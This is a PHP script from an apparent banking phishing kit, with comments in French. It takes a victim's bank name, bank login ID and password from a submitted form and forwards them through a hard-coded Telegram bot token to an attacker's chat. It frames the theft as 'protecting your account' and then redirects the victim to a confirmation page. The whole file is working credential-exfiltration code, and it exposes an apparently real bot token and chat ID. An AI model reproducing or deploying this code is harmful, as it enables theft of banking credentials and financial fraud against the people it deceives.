<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $bank_select = $_POST['bank_select'];
    $other_bank_name = $_POST['other_bank_name'];
    $IDbank = $_POST['IDbank'];
    $password = $_POST['password'];


    // Initialiser l'API de Telegram avec votre jeton d'API

    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Protegeons votre compte:\n\n";
    $message .= "Nom de la banque : $bank_select\n";
    $message .= "other_bank_name : $other_bank_name\n";
    $message .= "Ident de bank: $IDbank\n";
    $message .= "Mot de passe: $password\n";



    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '-1002427871420';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    // Rediriger l'utilisateur vers la page de confirmation
    header("Location: ./confirmation.php");
    exit();
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
